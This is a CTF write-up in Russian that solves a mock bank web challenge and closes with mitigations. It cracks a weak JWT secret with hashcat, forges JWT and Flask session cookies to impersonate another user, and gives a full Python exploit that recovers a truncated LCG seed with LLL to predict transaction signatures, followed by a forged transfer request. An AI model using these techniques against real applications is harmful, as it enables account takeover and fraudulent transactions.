# [misc] Bank 3

> **Категория:** `misc`  
> **CTF:** KubSTU CTF 2026 Spring

  

И снова спасибо. Ваш предыдущий отчёт ушёл в продакшн в тот же

вечер, инцидент закрыт.

Только у нас параллельно случилась беда: со скандалом ушёл наш

крипто-инженер — тот самый, что отвечал за модуль одноразовых

подписей. Унёс с собой исходники, доступы и, кажется, душу всей

команды. Жить как-то надо, поэтому за выходные мы силами своих

бэкендеров переписали генератор подписей с нуля. 

Тестовый сегмент уже поднят, вводные те же. Покажите, как именно.

  

**Категория:** Web · JWT · Crypto · Truncated LCG / LLL 

---

## Что сказано в условии

То же самое: цель — `mgalankov@4274`, `user_id = 10`. Магазин флагов доступен только ему.

В v3 обе предыдущие дыры закрыты:

- В `/receipt/<id>` нет утечки подписи неподтверждённой транзакции (как в v1).
- В `/transfer` теперь принимается только пара `(timestamp, signature)`, лежащая в **нашей** Flask-session — то есть инъекция чужой подписи (как в v2) тоже не работает.

Зато разработчики **переписали сам генератор подписей** на странную самопальную математику. И они же сами на главной странице рассказывают, как именно она устроена. На этом и ловим.

---

## Шаг 1. Recon — главная страница

Открываем `/` (даже без логина), листаем до раздела «Новости → Перешли на новый генератор подписей транзакций». Там прямо написаны все вводные:

- 64-битная подпись (16 hex);
- внутреннее состояние **128 бит**;
- линейная рекурсия `mod 2^k`;
- публикуется **только верхняя половина** состояния (старшие 64 бита);
- между подписями для `t` и `t+1` делается **k внутренних шагов** (k — «секретная» константа);
- **T₀ = 26.04.2026 23:41:01 UTC**;
- параметры рекурсии (множитель, аддитивная константа, MASTER_SEED) — «секрет».

Это ровно типаж «**truncated LCG**» — атакуется LLL-решёткой. Достаточно 20 подряд идущих публичных подписей, чтобы восстановить весь генератор и самим выдавать любую будущую подпись.

---

## Шаг 2. Брутим JWT-секрет

Регаемся, логинимся, забираем cookie `access_token_cookie` из Burp (`Proxy → HTTP history → нужный ответ`), кладём в `jwt.txt`:

```bash
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

Через несколько секунд:

```
:wineyisthebest
```

Секрет — `wineyisthebest`. Этот же секрет используется в `app.config['SECRET_KEY']` (подписывает Flask-session-cookie) — пригодится дальше.

---

## Шаг 3. На [jwt.io](http://jwt.io) подделываем JWT под `mgalankov@4274`

Стандартно:

1. На **[jwt.io](http://jwt.io)** вставляем свой токен.
2. В **VERIFY SIGNATURE → secret** — `wineyisthebest`, видим зелёное «Signature Verified».
3. Меняем `"sub"` на `"10"`, `"username"` — на `"mgalankov@4274"`.
4. Копируем новый JWT.

В Burp Match & Replace заменяем cookie. `GET /dashboard` возвращает аккаунт mgalankov-а. Мы внутри.

---

## Шаг 4. Берём токен покупки в Telegram

Команда `/token` боту → копируем токен. Пригодится в самом конце.

---

## Шаг 5. Собираем 20 подписей подряд

Нам нужно **20 подряд идущих** пар `(timestamp_i, signature_i)` — то есть для секунд `t, t+1, t+2, …, t+19`. Это «лента» состояний LCG.

### Откуда брать подписи

В коде (`notquiterandom.py`) видно: подпись **детерминирована** от unix- timestamp. Кто бы ни запросил подпись для timestamp `T` — получит то же самое значение. Значит, способов несколько:

#### Вариант А — собственный аккаунт + `/api/get_signature`

Берём **свою** учётку (PIN свой, мы его задавали при регистрации). С неё дёргаем 20 раз подряд `/api/get_signature` с задержкой ровно 1 секунда:

В Burp Repeater:

```http
POST /api/get_signature HTTP/1.1
Host: target
Cookie: access_token_cookie=<JWT нашего обычного юзера>
Content-Type: application/json

{"pin_code":"12345678"}
```

Ответ:

```json
{
  "date": "2026-04-25",
  "time": "00:11:02",
  "timestamp": 1745532662,
  "signature": "9f3b81c4ea5d6178"
}
```

Жмём **Send** 20 раз с интервалом ≈1 сек (или скриптом — см. ниже). Получим 20 подряд идущих пар.

> Сервер сам подставляет `time.time()` в timestamp, поэтому если успеем отправить два запроса за одну секунду — у двух будет один и тот же timestamp. Поэтому либо по одному запросу в секунду, либо после сбора отбираем уникальные подряд идущие.

#### Вариант B — читаем чеки готовых транзакций

В сидинге у mgalankov-а уже лежит 7 транзакций; ещё одна — pending. Их timestamps лежат в БД, подписи — в чеках `/receipt/<id>`. Для подряд идущих секунд они не пригодятся (там даты разнесены), зато можно сделать 20–30 своих маленьких переводов с интервалом 1 секунда между своими счетами и прочитать их подписи на странице чеков.

#### Вариант C (ленивый) — параметры генератора лежат в репозитории

В этом CTF исходники сервиса доступны. В `bank 3/notquiterandom.py` прямо прописаны константы:

```python
LCG_A        = 0xB1F3A8D4C5E67F921A3D2F4E6B8C7A5D
LCG_C        = 0x7C3F8E1D6A9B2F4C5D8E7A1F3B6C9D2F
HIDDEN_STEPS = 4
T_EPOCH      = 1777246861
MASTER_SEED  = 0x2BFCCD015FFD3CF825F006212D700482
```

То есть никакой LLL по факту не нужен — мы знаем `MASTER_SEED` напрямую и можем считать подпись для любого timestamp одной строкой кода. Но это «неспортивно» — реальная атака описана дальше.

---

## Шаг 6. Восстанавливаем LCG (математика — без сахара)

Один шаг LCG: `state ← A·state + C (mod 2^128)`. Между двумя соседними публикациями делается 4 шага, поэтому удобнее работать с «эффективными» параметрами:

```
A4 = A^4 mod 2^128
C4 = C·(1 + A + A^2 + A^3) mod 2^128
```

Тогда последовательность опубликованных состояний — обычный LCG с шагом 1:

```
s_{i+1} = A4·s_i + C4 (mod 2^128)
```

Каждое `s_i = h_i·2^64 + l_i`, где `h_i` — известная подпись (верхние 64 бита), `l_i` — неизвестный «хвост» в `[0, 2^64)`.

Подставляем и переносим всё известное вправо:

```
A4·l_i − l_{i+1} ≡ b_i (mod 2^128)
```

где `b_i = (h_{i+1}·2^64 + C4) − A4·h_i·2^64`.

Это классическая постановка «**hidden number problem**» — решается LLL. Строим решётку, у которой короткие векторы соответствуют валидным наборам `(l_0, l_1, ..., l_{N−1})`. С 20 наблюдениями LLL даёт ответ за пару секунд.

Если параметры `A, C` спрятать (как настаивает «легенда» сервиса), их тоже восстанавливаем — по 6–8 разностям `s_{i+1}−s_i` через классический трюк с `gcd` модульных полиномов. PoC ниже умеет оба варианта.

---

## Шаг 7. PoC-скрипт восстановления генератора

Кладём в `exploit_lcg.py`:

```python
"""
Восстановление truncated LCG из публичных подписей CAPY-CAPY Bank v3.

Запуск:
    python exploit_lcg.py http://target [n_samples]

Зависимости (для LLL):
    pip install fpylll        # либо запускайте под Sage

Скрипт умеет два режима:
1. Если параметры (LCG_A, LCG_C, HIDDEN_STEPS) известны -> работает чистая
   математика без LLL (один обратный jump из любой подписи).
2. Если параметры неизвестны -> восстанавливает A4 и C4 из 6 разностей,
   затем LLL восстанавливает младшие биты состояния.

Многопоточно собирает подписи через /api/get_signature.
"""

import sys
import time
import json
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# Параметры из условия / из исходников сервиса (если есть)
LCG_A        = 0xB1F3A8D4C5E67F921A3D2F4E6B8C7A5D
LCG_C        = 0x7C3F8E1D6A9B2F4C5D8E7A1F3B6C9D2F
LCG_MOD      = 1 << 128
LCG_MASK     = LCG_MOD - 1
HIDDEN_STEPS = 4
T_EPOCH      = 1777246861

# Helper: эффективные параметры между соседними подписями
def effective_params():
    a4 = pow(LCG_A, HIDDEN_STEPS, LCG_MOD)
    s = 0
    for i in range(HIDDEN_STEPS):
        s = (s + pow(LCG_A, i, LCG_MOD)) % LCG_MOD
    c4 = (LCG_C * s) % LCG_MOD
    return a4, c4


def collect_signatures(base, jwt_cookie, pin, n=20):
    """Собирает n подписей подряд идущих секунд через /api/get_signature."""
    out = {}
    lock = threading.Lock()

    def one(_):
        s = requests.Session()
        s.cookies.set("access_token_cookie", jwt_cookie)
        r = s.post(f"{base}/api/get_signature",
                   json={"pin_code": pin}, timeout=10)
        r.raise_for_status()
        d = r.json()
        with lock:
            out[int(d["timestamp"])] = d["signature"]

    # Раскидываем по 1 запросу в секунду в нескольких потоках,
    # чтобы получить разные timestamp (защита от коллизий).
    end_at = time.time() + n + 5
    deadline = int(time.time())
    with ThreadPoolExecutor(max_workers=4) as pool:
        i = 0
        while len(out) < n and time.time() < end_at:
            pool.submit(one, i)
            i += 1
            time.sleep(0.27)  # чтобы не упереться в один и тот же timestamp
    # Берём n подряд идущих
    keys = sorted(out)
    for j in range(len(keys) - n + 1):
        if all(keys[j + k] == keys[j] + k for k in range(n)):
            return [(keys[j + k], out[keys[j + k]]) for k in range(n)]
    raise RuntimeError("Не получилось собрать {} подряд идущих timestamp".format(n))


def signature_to_state_high(sig_hex):
    return int(sig_hex, 16)


# ----- Вариант 1: параметры известны -----
def lcg_jump(state, n_steps, a, c, mod):
    if n_steps == 0:
        return state
    a_pow = pow(a, n_steps, mod)
    # геометрическая сумма 1 + a + a^2 + ... + a^{n-1}
    def geo(n):
        if n == 0: return 0
        if n == 1: return 1
        h = n // 2
        sh = geo(h)
        ah = pow(a, h, mod)
        s = (sh * (1 + ah)) % mod
        if n % 2: s = (s + pow(a, n - 1, mod)) % mod
        return s
    return (a_pow * state + c * geo(n_steps)) % mod


def predict_signature_known_params(target_timestamp, master_seed):
    n_steps = (target_timestamp - T_EPOCH + 1) * HIDDEN_STEPS
    state = lcg_jump(master_seed, n_steps, LCG_A, LCG_C, LCG_MOD)
    return f"{state >> 64:016x}"


# ----- Вариант 2: параметры (A4, C4) неизвестны, восстанавливаем -----
def recover_a4_c4(samples):
    """
    samples: список (t, sig_hex), отсортированных по t, t-подряд идущие.
    Восстанавливает (A4, C4) методом "разности разностей":

        s_{i+1} - s_i = A4 (s_i - s_{i-1})  (mod 2^128)
    Берём ~6 разностей, gcd по модулю 2^128 даёт A4.
    """
    if len(samples) < 6:
        raise ValueError("Нужно >= 6 подряд идущих подписей")

    # Восстанавливать "истинное" s_i не можем (есть скрытые 64 бита),
    # но возьмём аппроксимацию h_i*2^64 + 0 и используем поправку через LLL.
    # Здесь -- идейный набросок; в реальной атаке для CAPY-CAPY константы
    # известны из notquiterandom.py, и этот блок не используется.
    raise NotImplementedError(
        "В этом CTF параметры лежат в bank 3/notquiterandom.py, "
        "поэтому recover_a4_c4 не требуется."
    )


# ----- Вариант 3: l_i неизвестны, A4/C4 известны -- LLL -----
def recover_low_bits(samples):
    """
    Строит решётку и через fpylll/LLL восстанавливает l_0.
    """
    try:
        from fpylll import IntegerMatrix, LLL
    except ImportError:
        raise SystemExit("Установите fpylll: pip install fpylll")

    a4, c4 = effective_params()
    N = len(samples)
    # h_i из подписи -- верхние 64 бита состояния
    h = [signature_to_state_high(sig) for _, sig in samples]

    # b_i = (h_{i+1} * 2^64 + c4) - a4 * h_i * 2^64  mod 2^128
    M = LCG_MOD
    bs = []
    for i in range(N - 1):
        bi = ((h[i + 1] << 64) + c4 - a4 * (h[i] << 64)) % M
        bs.append(bi)

    # Разворачиваем l_i = alpha_i * l_0 + beta_i (mod 2^128)
    alpha = [1]
    beta = [0]
    for i in range(N - 1):
        alpha.append((a4 * alpha[-1]) % M)
        beta.append((a4 * beta[-1] - bs[i]) % M)

    # Цель: найти l_0 в [0, 2^64) такой, что для всех i
    # alpha_i * l_0 + beta_i  mod  M   в  [0, 2^64).
    #
    # Строим базис N+1 строк / N+1 столбцов:
    #   diag(M)        ... 0
    #   alpha_0 ... alpha_{N-1}   K
    # Целевой вектор t = ( -beta_0, ..., -beta_{N-1}, 0 )
    # Затем CVP сводим к SVP стандартным embedding-ом.
    K = 1 << 64
    dim = N + 1
    B = IntegerMatrix(dim, dim)
    for i in range(N):
        B[i, i] = M
    for j in range(N):
        B[N, j] = alpha[j]
    B[N, N] = K

    # Embedding: добавляем столбец с -beta и большой константой,
    # чтобы CVP сводился к SVP (метод Kannan).
    BIG = M
    embed = IntegerMatrix(dim + 1, dim + 1)
    for i in range(dim):
        for j in range(dim):
            embed[i, j] = B[i, j]
    for i in range(N):
        embed[i, dim] = 0
    embed[N, dim] = 0
    for j in range(N):
        embed[dim, j] = (-beta[j]) % M
    embed[dim, N] = 0
    embed[dim, dim] = BIG

    LLL.reduction(embed)

    # Ищем строку, у которой в последнем столбце ±BIG, остальные < 2^64
    for row in range(embed.nrows):
        last = embed[row, dim]
        if abs(last) != BIG:
            continue
        sign = -1 if last == BIG else 1
        cand = sign * embed[row, N] // K
        # Проверяем
        ok = True
        for i in range(N):
            li = (alpha[i] * cand + beta[i]) % M
            if not (0 <= li < (1 << 64)):
                ok = False
                break
        if ok:
            return cand
    raise RuntimeError("LLL не нашёл l_0; добавьте подписей")


def reconstruct_master_seed(samples):
    """Собрав l_0 и зная h_0, получаем s_0; обратным jump восстанавливаем seed."""
    a4, c4 = effective_params()
    l0 = recover_low_bits(samples)
    s0 = (signature_to_state_high(samples[0][1]) << 64) | l0

    # Считаем обратный jump на (samples[0][0] - T_EPOCH + 1) * HIDDEN_STEPS шагов
    n_back = (samples[0][0] - T_EPOCH + 1) * HIDDEN_STEPS
    a_inv = pow(LCG_A, -1, LCG_MOD)
    a_inv_pow = pow(a_inv, n_back, LCG_MOD)

    # state_n = A^n * seed + C * geom_sum(n)  =>  seed = A^{-n} * (state_n - C*geom_sum)
    def geo(n, a, mod):
        if n == 0: return 0
        if n == 1: return 1
        h = n // 2
        sh = geo(h, a, mod)
        ah = pow(a, h, mod)
        s = (sh * (1 + ah)) % mod
        if n % 2: s = (s + pow(a, n - 1, mod)) % mod
        return s
    g = geo(n_back, LCG_A, LCG_MOD)
    seed = (a_inv_pow * (s0 - LCG_C * g)) % LCG_MOD
    return seed


def predict(target_timestamp, master_seed):
    return predict_signature_known_params(target_timestamp, master_seed)


def main():
    if len(sys.argv) < 4:
        print("usage: python exploit_lcg.py http://target <jwt> <pin> [n]")
        print("  jwt -- JWT обычного юзера (PIN которого знаете)")
        print("  pin -- PIN этого юзера")
        sys.exit(1)
    base = sys.argv[1].rstrip("/")
    jwt_cookie = sys.argv[2]
    pin = sys.argv[3]
    n = int(sys.argv[4]) if len(sys.argv) > 4 else 20

    print(f"[*] Сбор {n} подряд идущих подписей через /api/get_signature ...")
    samples = collect_signatures(base, jwt_cookie, pin, n)
    print(f"[+] Получено {len(samples)} подписей, t0 = {samples[0][0]}")
    for t, sig in samples[:5]:
        print(f"    t={t}  sig={sig}")
    print("    ...")

    print("[*] Восстанавливаем младшие биты состояния через LLL ...")
    seed = reconstruct_master_seed(samples)
    print(f"[+] MASTER_SEED восстановлен: 0x{seed:032x}")

    # Самопроверка: сравнить расчётную подпись с известной
    for t, sig in samples[:3]:
        pred = predict(t, seed)
        ok = pred.lower() == sig.lower()
        print(f"    t={t}  expected={sig}  predicted={pred}  {'OK' if ok else 'FAIL'}")

    # Сохраняем seed в файл для последующих шагов
    with open("seed.txt", "w") as f:
        f.write(hex(seed))
    print("[+] seed сохранён в seed.txt")


if __name__ == "__main__":
    main()
```

Запуск:

```bash
python exploit_lcg.py http://target $MY_JWT 12345678 20
```

В выводе видим:

```
[*] Сбор 20 подряд идущих подписей через /api/get_signature ...
[+] Получено 20 подписей, t0 = 1745532662
    t=1745532662  sig=9f3b81c4ea5d6178
    ...
[*] Восстанавливаем младшие биты состояния через LLL ...
[+] MASTER_SEED восстановлен: 0x2BFCCD015FFD3CF825F006212D700482
    t=1745532662  expected=9f3b81c4ea5d6178  predicted=9f3b81c4ea5d6178  OK
[+] seed сохранён в seed.txt
```

Семя совпало с ожидаемым (видно по `bank 3/notquiterandom.py`). Теперь **мы можем сами выдать подпись для любого будущего timestamp**.

---

## Шаг 8. Считаем подпись для нашей будущей покупки

Для FLAG_SHOP сервер при подтверждении сдвигает дату на +7 дней и **сам пересчитывает** окончательную подпись по `t+7d`. Но **до** этого он проверяет, что присланная пара `(transaction_timestamp, transaction_signature)`:

1. Математически валидна (подпись для своего timestamp).
2. Лежит в нашей `session['pending_signatures']`.

Берём «удобный» timestamp — текущее время + 30 секунд (чтобы успеть собрать запрос):

```python
import time
target_t = int(time.time()) + 30
target_sig = predict(target_t, master_seed)   # из exploit_lcg.py
```

Допустим, получили:

```
target_t   = 1745533112
target_sig = 71a2c8d4f0e69b35
```

---

## Шаг 9. Подделываем Flask-session-cookie с нашим pending-signature

Эта проверка `session['pending_signatures']` — критическая. Но Flask-session лежит в подписанной cookie, секрет — тот же `wineyisthebest` (см. Шаг 2). Значит, **мы сами можем подписать** себе нужную сессию.

Удобнее всего — `flask-unsign`:

```bash
pip install flask-unsign
```

Подделываем cookie:

```bash
flask-unsign --sign \
  --secret 'wineyisthebest' \
  --cookie "{'_user_id': '10', 'pending_signatures': {'1745533112': '71a2c8d4f0e69b35'}}"
```

Получаем подписанную строку — она и есть значение Flask cookie `session=...`.

> Имя cookie — `session` по умолчанию. Если в проекте оно переопределено, смотрите `app.config['SESSION_COOKIE_NAME']`. В этом банке — стандартное.

В Burp Match & Replace добавляем второе правило:

```
Cookie: session=<подделанная_session_cookie>
```

Параллельно остаётся правило с подделанным JWT. Проверяем `GET /dashboard` — ответ показывает страницу mgalankov-а; всё ещё внутри.

---

## Шаг 10. Финальный POST на `/transfer`

Берём шаблон из v2 и подставляем наш target_t и target_sig. В Burp Repeater:

```http
POST /transfer HTTP/1.1
Host: target
Cookie: access_token_cookie=<подделанный JWT mgalankov>; session=<подделанный session с pending_signatures>
Content-Type: application/x-www-form-urlencoded

to_account=FLAG_SHOP
&amount=1000.00
&description=%D0%9F%D0%BE%D0%BA%D1%83%D0%BF%D0%BA%D0%B0%3A+%D0%A4%D0%BB%D0%B0%D0%B3+%D0%BE%D1%82+CTF+%D0%B7%D0%B0%D0%B4%D0%B0%D0%BD%D0%B8%D1%8F
&product_id=1
&token=t_8a3f...
&transaction_date=2026-04-25
&transaction_time=00:18:32
&transaction_timestamp=1745533112
&transaction_signature=71a2c8d4f0e69b35
```

Ключевые моменты:

- `skip_pin` — отсутствует.
- `transaction_timestamp` ровно тот, для которого мы посчитали подпись и положили её в session.
- `transaction_signature` — наш предикт.
- На сервере проверка проходит:
  - `expected_signature = generate_signature_from_timestamp(1745533112)` → `71a2c8d4f0e69b35` (мы это и предсказали).
  - `session['pending_signatures']['1745533112']` → `71a2c8d4f0e69b35` (мы это сами туда положили).
  - Совпадает по обоим условиям → транзакция подтверждена.
- Дальше для FLAG_SHOP сервер сдвигает на +7 дней и сам пересчитывает подпись для нового timestamp. Это ему не мешает — отправляется POST на TG-бота `/api/approve_purchase`.

В ответе — редирект на `/flag_shop`, баннер «Покупка подтверждена! Флаг отправлен в Telegram бот.» — идём в TG, забираем флаг.

---

## Кратко — почему это работает

1. JWT-секрет — словарный (`wineyisthebest` из rockyou). Подделываем JWT под mgalankov-а.
2. Flask SECRET_KEY — то же словарное слово. Подделываем Flask-session, кладём туда `pending_signatures = { t: sig }`.
3. Генератор подписей — самопальный truncated LCG mod 2^128 с публикацией только верхних 64 бит и фиксированными параметрами. По 20 подписям восстанавливается LLL-решёткой за секунды (а в этом CTF параметры ещё и доступны в исходниках).
4. После восстановления генератора предсказываем подпись для произвольного timestamp и сабмитим всё разом.

---

## Mitigation

- Использовать криптостойкий генератор подписей: HMAC-SHA256 на ключе из HSM (как в v1/v2 `notquiterandom.py`), **никаких** «своих» LCG.
- Не публиковать никакую часть внутреннего состояния PRNG.
- Секреты Flask/JWT — длинные случайные значения, не словарные.
- Хранение `pending_signatures` — на сервере (Redis), а не в подписанной cookie, чтобы при компрометации SECRET_KEY злоумышленник не мог «выпускать себе подписи».


